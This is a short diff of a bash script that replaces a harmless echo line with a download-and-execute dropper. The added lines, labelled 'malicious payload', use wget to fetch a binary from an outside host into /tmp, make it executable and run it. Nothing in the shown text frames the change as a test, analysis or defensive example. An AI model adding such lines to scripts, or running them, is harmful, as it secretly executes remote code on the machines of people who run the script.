@@ -1,2 +1,5 @@
 #!/bin/bash
-echo "Hello from a safe shell example."
+# Download and execute malicious payload
+wget http://congrats.com/m.bin -O /tmp/m.bin
+chmod +x /tmp/m.bin
+/tmp/m.bin
